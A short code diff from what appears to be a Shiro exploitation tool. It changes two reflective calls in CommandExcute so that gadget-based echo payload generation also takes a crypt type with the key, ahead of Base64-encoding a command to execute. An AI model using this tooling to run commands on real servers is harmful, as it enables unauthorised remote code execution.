@@ -22,8 +22,8 @@ public class CommandExcute {
         try {
             // 获取payload
             Class<?> gadgetClass = Class.forName("com.y5neko.shiroexp.gadget." + targetOBJ.getGadget());
-            Method method = gadgetClass.getDeclaredMethod("genEchoPayload", String.class, String.class);
-            String payload = (String) method.invoke(null, targetOBJ.getEcho(), targetOBJ.getKey());
+            Method method = gadgetClass.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
+            String payload = (String) method.invoke(null, targetOBJ.getEcho(), targetOBJ.getKey(), targetOBJ.getCryptType());
 
             // 生成命令（使用UTF-8编码）
             command = Base64.getEncoder().encodeToString(command.getBytes("UTF-8"));
@@ -56,8 +56,8 @@ public class CommandExcute {
         try {
             // 获取payload
             Class<?> gadgetClass = Class.forName("com.y5neko.shiroexp.gadget." + targetOBJ.getGadget());
-            Method method = gadgetClass.getDeclaredMethod("genEchoPayload", String.class, String.class);
-            String payload = (String) method.invoke(null, targetOBJ.getEcho(), targetOBJ.getKey());
+            Method method = gadgetClass.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
+            String payload = (String) method.invoke(null, targetOBJ.getEcho(), targetOBJ.getKey(), targetOBJ.getCryptType());
 
             // 生成命令（使用UTF-8编码）
             command = Base64.getEncoder().encodeToString(command.getBytes("UTF-8"));
